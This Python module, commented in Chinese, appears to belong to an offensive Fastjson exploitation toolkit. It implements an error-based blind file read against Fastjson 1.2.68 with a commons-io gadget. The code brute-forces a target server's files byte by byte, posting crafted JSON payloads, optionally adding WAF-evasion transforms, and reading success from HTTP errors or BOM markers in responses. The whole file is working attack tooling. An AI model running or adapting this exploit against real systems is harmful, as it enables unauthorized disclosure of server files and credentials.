"""commons-io 报错读：逐字节爆破读文件/目录。

对齐浅蓝笔记：正确猜测时报错，错误时不报错；用码表扩展前缀直至读满或无匹配。
见 https://b1ue.cn/archives/506.html
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Literal, Optional, Sequence

import httpx

from fastjson_toolkit.poc.getter import wrap_with_currency
from fastjson_toolkit.poc.v1_2_68.payloads import build_io_read_error
from fastjson_toolkit.waf import apply_waf_payload
from fastjson_toolkit.waf.models import WafOptions

# linux 路径/文件名常见字符（小写）
ASCII_LINUX_LOWER: list[int] = [
    10,
    32,
    45,
    46,
    47,
    *range(48, 58),
    91,
    92,
    95,
    *range(97, 123),
]

# 含大小写（默认，对齐笔记配套脚本）
ASCII_LINUX_MIXED: list[int] = [
    10,
    32,
    45,
    46,
    47,
    *range(48, 58),
    *range(65, 91),
    91,
    92,
    95,
    *range(97, 123),
]

# 可见 ASCII（含控制换行）
ASCII_PRINTABLE: list[int] = list(range(10, 127))

ReadCharsetName = Literal["mixed", "lower", "printable"]

CHARSET_PRESETS: dict[str, list[int]] = {
    "mixed": ASCII_LINUX_MIXED,
    "lower": ASCII_LINUX_LOWER,
    "printable": ASCII_PRINTABLE,
}


def resolve_read_charset(
    name: Optional[str] = None,
    custom: Optional[Sequence[int]] = None,
) -> list[int]:
    if custom:
        out = [int(b) & 0xFF for b in custom]
        if not out:
            raise ValueError("read_charset_bytes 不能为空")
        return out
    key = (name or "mixed").strip().lower()
    if key not in CHARSET_PRESETS:
        raise ValueError(
            f"未知 read_charset={name!r}；可选: {', '.join(CHARSET_PRESETS)}"
        )
    return list(CHARSET_PRESETS[key])


def is_error_read_match(
    status_code: Optional[int],
    text: str,
    *,
    marker: str = "charSequence",
) -> bool:
    """判定本轮猜测是否命中（BOM 前缀与文件一致）。

    观测通道因目标而异，按优先级：
    1. HTTP ≥400（浅蓝笔记：类型不匹配抛错）
    2. 响应序列化出 ``bOM`` / ``BOM``（本仓库靶场：猜对仍 200，但带 BOM）
    3. 错误体 / 页面含 ``charSequence``（笔记配套脚本）
    """
    body = text or ""
    if status_code is not None and status_code >= 400:
        return True
    # commons-io getBOM → Fastjson 序列化字段名常为 bOM
    if '"bOM"' in body or '"BOM"' in body:
        return True
    if marker and marker in body:
        return True
    return False


@dataclass
class IoReadBruteResult:
    ok: bool
    url: str
    bytes: list[int] = field(default_factory=list)
    content: str = ""
    probes: int = 0
    last_payload: str = ""
    last_status: Optional[int] = None
    last_preview: str = ""
    notes: list[str] = field(default_factory=list)
    summary: str = ""


def bytes_to_content(data: Sequence[int]) -> str:
    return "".join(chr(int(b) & 0xFF) for b in data)


def brute_read_file_by_error(
    *,
    url: str,
    target: str,
    max_length: int = 50,
    charset: Optional[Sequence[int]] = None,
    charset_name: Optional[str] = None,
    timeout: float = 15.0,
    headers: Optional[dict[str, str]] = None,
    proxy: Optional[str] = None,
    insecure: bool = False,
    content_type: str = "application/json",
    wrap_currency: bool = False,
    currency_field: str = "currency",
    waf_techniques: Optional[list[str]] = None,
    waf_options: Optional[WafOptions] = None,
    match_fn: Optional[Callable[[Optional[int], str], bool]] = None,
    on_progress: Optional[Callable[[int, list[int], str], None]] = None,
) -> IoReadBruteResult:
    """逐字节爆破：扩展 BOM bytes 前缀，直至读满 max_length 或本轮无匹配。"""
    if max_length < 1:
        raise ValueError("read_length 须 ≥ 1")
    table = list(charset) if charset is not None else resolve_read_charset(charset_name)
    oracle = match_fn or (
        lambda code, text: is_error_read_match(code, text)
    )
    req_headers = {"Content-Type": content_type, **(headers or {})}
    found: list[int] = []
    probes = 0
    last_payload = ""
    last_status: Optional[int] = None
    last_preview = ""
    notes: list[str] = [
        f"报错读爆破：url={url}，max_length={max_length}，charset={len(table)} chars",
        "判定：猜对 → HTTP≥400 / 响应含 bOM / 含 charSequence；猜错则无这些特征。",
    ]

    def _build(probe_bytes: list[int]) -> str:
        raw = build_io_read_error(url, bom_bytes=probe_bytes)
        if wrap_currency:
            raw = wrap_with_currency(raw, currency_field=currency_field)
        payload, _, _ = apply_waf_payload(raw, waf_techniques or [], waf_options)
        return payload

    try:
        with httpx.Client(
            timeout=timeout,
            proxy=proxy,
            verify=not insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            for _pos in range(max_length):
                matched: Optional[int] = None
                for b in table:
                    probe = found + [int(b)]
                    last_payload = _build(probe)
                    probes += 1
                    try:
                        resp = client.post(
                            target,
                            content=last_payload.encode("utf-8"),
                            headers=req_headers,
                        )
                    except Exception as exc:  # noqa: BLE001
                        return IoReadBruteResult(
                            ok=False,
                            url=url,
                            bytes=found,
                            content=bytes_to_content(found),
                            probes=probes,
                            last_payload=last_payload,
                            notes=notes
                            + [f"第 {len(found)+1} 字节探测失败: {exc}"],
                            summary=f"爆破中断: {exc}",
                        )
                    last_status = resp.status_code
                    last_preview = (resp.text or "")[:2000]
                    if oracle(resp.status_code, resp.text or ""):
                        matched = int(b)
                        break
                if matched is None:
                    notes.append(
                        f"位置 {len(found)} 码表无匹配，视为 EOF / 字符不在码表内"
                    )
                    break
                found.append(matched)
                content = bytes_to_content(found)
                if on_progress:
                    on_progress(len(found), list(found), content)
    except Exception as exc:  # noqa: BLE001
        return IoReadBruteResult(
            ok=False,
            url=url,
            bytes=found,
            content=bytes_to_content(found),
            probes=probes,
            last_payload=last_payload,
            last_status=last_status,
            last_preview=last_preview,
            notes=notes + [str(exc)],
            summary=f"爆破失败: {exc}",
        )

    content = bytes_to_content(found)
    notes.append(f"读得 {len(found)} 字节，共 {probes} 次探测")
    return IoReadBruteResult(
        ok=True,
        url=url,
        bytes=found,
        content=content,
        probes=probes,
        last_payload=last_payload or _build(found or [70]),
        last_status=last_status,
        last_preview=last_preview,
        notes=notes,
        summary=(
            f"报错读完成：{len(found)} 字节 / {probes} probes → {content!r}"
            if found
            else f"报错读无结果（{probes} probes）；检查 URL / 码表 / 报错差异"
        ),
    )


__all__ = [
    "ASCII_LINUX_LOWER",
    "ASCII_LINUX_MIXED",
    "ASCII_PRINTABLE",
    "CHARSET_PRESETS",
    "IoReadBruteResult",
    "ReadCharsetName",
    "brute_read_file_by_error",
    "bytes_to_content",
    "is_error_read_match",
    "resolve_read_charset",
]
